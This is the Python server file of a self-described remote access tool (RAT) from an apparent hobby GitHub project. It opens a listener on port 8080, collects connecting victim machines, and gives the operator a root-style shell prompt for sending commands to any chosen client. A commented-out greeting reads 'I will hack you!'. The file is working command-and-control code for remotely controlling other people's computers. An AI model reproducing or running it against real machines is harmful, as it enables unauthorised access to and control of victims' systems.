"""
server.py
version = 0.002
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""
import os
import socket
import base64
import random
import datetime
import time
from functions import *
import threading
import sys
from queue import Queue
import struct
import signal

#Welcome
print("[+] Welcome to Lukas Alstrup's Remote Access tool")
print("""  _     _    _ _  __           _____            _       _____ _______ _____  _    _ _____  
 | |   | |  | | |/ /    /\    / ____|     /\   | |     / ____|__   __|  __ \| |  | |  __ \ 
 | |   | |  | | ' /    /  \  | (___      /  \  | |    | (___    | |  | |__) | |  | | |__) |
 | |   | |  | |  <    / /\ \  \___ \    / /\ \ | |     \___ \   | |  |  _  /| |  | |  ___/ 
 | |___| |__| | . \  / ____ \ ____) |  / ____ \| |____ ____) |  | |  | | \ \| |__| | |     
 |______\____/|_|\_\/_/    \_\_____/  /_/    \_\______|_____/   |_|  |_|  \_\\____/|_|     
                                                                                           
                                                                                           """)



host = "0.0.0.0"
port = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

clients = []
addresses = []

def listen():
    while True:
        # Accept Connection
        client, address = server.accept()
        clients.append(client)
        addresses.append(address)
        print(f"Connected with {addresses[-1][0]}")

def control():
    while True:
        control_command = input("Command: ")

        if control_command == "list":
            print("---Clients----")

            for client in range(len(clients)):
                print(str(client) + " " + str(addresses[client][0]))

            print("---Clients----")

        elif control_command[0:7] == "connect":
            clientID = int(input("Client ID: "))
            conn = clients[clientID]
            #conn.send("Hello client! I will hack you!".encode())
            
            name = conn.recv(1024)
            ip = addresses[clientID]
            
            name.decode()
            while True:
                #username.decode()) + "@" + str(addr[0])+ " :~# "
                command = input(name.decode() + "@" + str(ip[0]) + " :~# ")
                check_command(conn=conn,command=command)
        




#listens forever and appends new clients to clients list
listener_thread = threading.Thread(target=listen)
listener_thread.start()
control()


         
        
"""#Listen
s = socket.socket()
#host = socket.gethostname()
host = "0.0.0.0"
port = 8080

s.bind((host, port))
print("[+] The listener has been started...")
print("[+] LHOST = ", host)
print("[+] LPORT = ", port)
print("[+] Waiting for incomming connections")
s.listen(1)
conn, addr = s.accept()

print("[+] ", addr, "has connected to the server successfully")
print("")

username = conn.recv(10000000)

name = str(str(username.decode()) + "@" + str(addr[0])+ " :~# ")

while True:
    command = str(input(name))
    check_command(conn,command)
"""